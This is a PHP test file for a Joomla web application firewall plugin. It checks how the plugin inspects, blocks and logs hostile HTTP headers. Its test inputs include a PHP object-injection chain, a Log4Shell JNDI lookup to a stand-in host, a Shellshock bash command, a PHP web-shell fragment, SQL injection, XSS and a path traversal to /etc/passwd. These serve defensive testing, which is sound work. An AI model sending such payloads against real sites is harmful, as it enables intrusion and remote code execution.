<?php
/**
 * Header inspection through the real plugin class (with Joomla stand-ins):
 * settings, modes, trusted-IP interplay, log output. Included by run.php after
 * header_tests.php (uses flow() / flowCheck() from plugin_flow_tests.php).
 *
 * @package     Colorpack Shield
 * @copyright   Copyright (C) 2026 COLORPACK CREATION CO., LTD. All rights reserved.
 * @license     GNU General Public License version 3 or later
 */

use Colorpack\Plugin\System\ColorpackShield\Waf\Rules\HeaderRules;
use Joomla\CMS\Log\Log;

echo "== Plugin flow: header inspection ==\n";

$peer    = ['REMOTE_ADDR' => '198.51.100.1'];
$browser = [
    'HTTP_HOST' => 'www.example.com',
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'HTTP_ACCEPT' => 'text/html,application/xhtml+xml,*/*;q=0.8',
    'HTTP_ACCEPT_LANGUAGE' => 'th-TH,th;q=0.9,en;q=0.8',
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate, br',
    'HTTP_REFERER' => 'https://www.google.com/search?q=joomla+union+select+tutorial',
    'HTTP_CONNECTION' => 'keep-alive',
    'HTTP_COOKIE' => 'joomla_user_state=logged_in; _ga=GA1.1.1.2',
    'HTTP_CF_VISITOR' => '{"scheme":"https"}',
    'HTTP_SEC_CH_UA' => '"Chromium";v="119"',
];
$logLines = static fn (): string => implode("\n", Log::$messages);

Log::$messages = [];
flowCheck('ordinary browser request is allowed', flow([], $peer + $browser), false);
ipCheck('…and writes nothing to the log (nothing to detect)', Log::$messages === []);

$objInj = ['HTTP_USER_AGENT' => '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}}'];
Log::$messages = [];
flowCheck('PHP object injection in User-Agent', flow([], $peer + $objInj), true);
ipCheck('…the log names the rule and the header', str_contains($logLines(), 'BLOCK') && str_contains($logLines(), 'shield=header rule=php_object_injection') && str_contains($logLines(), 'key=User-Agent'));

flowCheck('same attack in X-Forwarded-For', flow([], $peer + ['HTTP_X_FORWARDED_FOR' => $objInj['HTTP_USER_AGENT']]), true);
flowCheck('SQLi text in X-Forwarded-For (malformed IP list)', flow([], $peer + ['HTTP_X_FORWARDED_FOR' => "1.2.3.4' OR SLEEP(5)-- -"]), true);
flowCheck('${jndi:…} in User-Agent', flow([], $peer + ['HTTP_USER_AGENT' => '${jndi:ldap://evil.example/a}']), true);
flowCheck('Shellshock in User-Agent', flow([], $peer + ['HTTP_USER_AGENT' => '() { :;}; /bin/bash -c id']), true);
flowCheck('<?php in Referer', flow([], $peer + ['HTTP_REFERER' => '<?php system($_GET[1]);']), true);
flowCheck('garbage Host header', flow([], $peer + ['HTTP_HOST' => '"><script>x</script>']), true);
flowCheck('garbage Accept-Language', flow([], $peer + ['HTTP_ACCEPT_LANGUAGE' => '../../../../etc/passwd']), true);

// Detect-only findings.
$union = ['HTTP_USER_AGENT' => "1' UNION SELECT user,pass FROM x-- -"];
Log::$messages = [];
flowCheck('UNION SELECT in User-Agent is only logged by default', flow([], $peer + $union), false);
ipCheck('…as a DETECT line with rule, header and sample',
    str_contains($logLines(), 'DETECT') && str_contains($logLines(), 'rule=sqli_strict') && str_contains($logLines(), 'key=User-Agent') && str_contains($logLines(), 'UNION SELECT'));
ipCheck('…and not as a BLOCK', !str_contains($logLines(), 'BLOCK'));

Log::$messages = [];
$five = [
    'HTTP_USER_AGENT' => '<script>alert(1)</script>', 'HTTP_REFERER' => '<script>alert(2)</script>', 'HTTP_ORIGIN' => '<script>alert(3)</script>',
    'HTTP_FROM' => '<script>alert(4)</script>', 'HTTP_X_REQUESTED_WITH' => '<script>alert(5)</script>',
];
flowCheck('five detect-only findings do not block', flow([], $peer + $five), false);
ipCheck('…and at most 3 DETECT lines are written for one request', substr_count($logLines(), 'DETECT') === 3);

// Settings.
flowCheck('header_scan=0: the same object injection is not inspected', flow(['header_scan' => 0], $peer + $objInj), false);
Log::$messages = [];
flowCheck('header_mode=log: a clear attack is only logged', flow(['header_mode' => 'log'], $peer + ['HTTP_USER_AGENT' => '${jndi:ldap://x/a}']), false);
ipCheck('…and appears as DETECT', str_contains($logLines(), 'DETECT') && str_contains($logLines(), 'rule=jndi_lookup'));
flowCheck('header_mode=block: a normally log-only finding blocks', flow(['header_mode' => 'block'], $peer + $union), true);
flowCheck('header_mode=junk behaves like the default', flow(['header_mode' => 'nonsense'], $peer + $union), false);

$custom = ['HTTP_X_API_VERSION' => '<?php system(1); ?>'];
flowCheck('a header the plugin does not know is not inspected', flow([], $peer + $custom), false);
flowCheck('…until the operator lists it', flow(['extra_scan_headers' => "X-Api-Version\n"], $peer + $custom), true);
flowCheck('ignored_headers exempts a header', flow(['ignored_headers' => 'Referer'], $peer + ['HTTP_REFERER' => '<?php x']), false);
flowCheck('…but only that one', flow(['ignored_headers' => 'Referer'], $peer + ['HTTP_USER_AGENT' => '<?php x']), true);

// Secrets are neither inspected nor logged.
Log::$messages = [];
flowCheck('Authorization / token headers with odd content are allowed',
    flow([], $peer + $browser + ['HTTP_AUTHORIZATION' => "Bearer abc'--<?php", 'HTTP_X_JOOMLA_TOKEN' => '<script>']), false);
ipCheck('…and nothing about them is logged', Log::$messages === []);
flowCheck('the raw Cookie header is not header-scanned (cookies are checked through $_COOKIE as before)', flow([], $peer + ['HTTP_COOKIE' => "a=1' UNION SELECT user,pass FROM x-- -"]), false);

// Scope.
flowCheck('administrator app is covered by default', flow([], $peer + $objInj, [], [], 'administrator'), true);
flowCheck('cover_admin=0 turns the header shield off there too', flow(['cover_admin' => 0], $peer + $objInj, [], [], 'administrator'), false);

// Trusted IPs (AUDIT.md C1 semantics): FULL trust skips everything, SOFT trust is still inspected.
$trust = ['allow_ips' => "203.0.113.5\n"];
flowCheck('trusted IP connecting directly skips header checks (full trust)', flow($trust, ['REMOTE_ADDR' => '203.0.113.5'] + $objInj), false);
flowCheck('trusted IP learned from a Cloudflare header is still inspected (soft trust)',
    flow($trust, ['REMOTE_ADDR' => '104.16.0.1', 'HTTP_CF_CONNECTING_IP' => '203.0.113.5'] + $objInj), true);

// Header attack from a request that also has a clean-looking spoofed CF header does not slip through.
flowCheck('attack header + forged CF-Connecting-IP from an ordinary peer is blocked',
    flow([], $peer + ['HTTP_CF_CONNECTING_IP' => '203.0.113.5'] + $objInj), true);

// The default header-rule modes are what the plan promised.
ipCheck('every rule has a default mode of block or log', array_diff(array_values(HeaderRules::RULES), ['block', 'log']) === []);
